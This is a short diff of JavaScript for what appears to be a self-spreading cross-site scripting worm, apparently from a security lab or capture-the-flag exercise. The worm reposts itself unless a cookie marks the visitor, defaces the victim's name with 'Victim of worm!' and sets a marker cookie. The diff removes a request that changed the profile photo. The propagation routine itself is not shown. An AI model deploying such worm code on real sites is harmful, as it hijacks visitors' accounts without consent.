@@ -47,16 +47,14 @@ function post_About() {
 }
 
 function change_Profile(){
-    var r1 = getRandomInt(4);
-    var pictureURL = encodeURIComponent(links[r1]);
-
-    var xht = new XMLHttpRequest();
-    xht.open("GET", `/change_photo.php?type=profile&url=${pictureURL}`,true);
-    cht.send(); 
+    oof = document.getElementById("name");
+    oof.innerText = "Victim of worm!";
 }
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
-post_About();
-setTimeout(change_Profile, 1000);
+if (cookies.get("commented") != "yes") {
+    post_About();
+}
+change_Profile();
 
 document.cookie = "rekt=yes"
